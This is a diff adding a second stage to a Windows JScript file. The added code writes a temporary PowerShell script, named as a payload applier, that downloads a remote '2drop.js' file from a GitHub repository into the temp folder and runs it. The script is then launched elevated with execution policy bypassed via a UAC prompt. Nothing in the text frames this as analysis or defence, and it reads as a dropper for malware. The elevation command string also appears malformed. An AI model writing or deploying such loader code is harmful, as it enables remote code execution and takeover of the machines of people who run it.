@@ -40,8 +40,46 @@ try {
     shell.Popup("Failed to launch elevated PowerShell: " + e.message, 8, "Error", 16);
     WScript.Quit(1);
 }
+// phase two
+
+// Build temp PS file path
+psFilename = "apply_payload_" + (new Date().getTime()) + ".ps1";
+psPath = tempFolder + "\\" + psFilename;
+
+// PowerShell script content (robust with try/catch and readable output)
+psContent =
+'$url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/master/2drop.js";\n' +
+'$destination = "$env:TEMP\\2drop.js";\n' +
+'Invoke-WebRequest -Uri $url -OutFile $destination;\n' +
+'Start-Process $destination;\n';
+
+// Write the PS script to temp
+try {
+    file = fso.CreateTextFile(psPath, true);
+    file.Write(psContent);
+    file.Close();
+} catch (e) {
+    shell.Popup("Failed to write temp PowerShell script: " + e.message, 8, "Error", 16);
+    WScript.Quit(1);
+}
+
+// Build command that starts an elevated PowerShell to run the PS file with -NoExit
+// We use Start-Process ... -Verb RunAs so the user gets the UAC prompt and the PS window stays visible.
+
+elevateCmd = "powershell -NoProfile -Command \"Start-Process -FilePath 'powershell' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \\\"" + psPath + "\\\";
+
+
+try {
+    shell.Run(elevateCmd, 1, false); // show window; do not wait (PS will stay open)
+} catch (e) {
+    shell.Popup("Failed to launch elevated PowerShell: " + e.message, 8, "Error", 16);
+    WScript.Quit(1);
+}
+
+
 // If you want the temp file removed after the PS window closes, you can add a cleanup step manually.
 WScript.Quit(0);
+
 
 
 
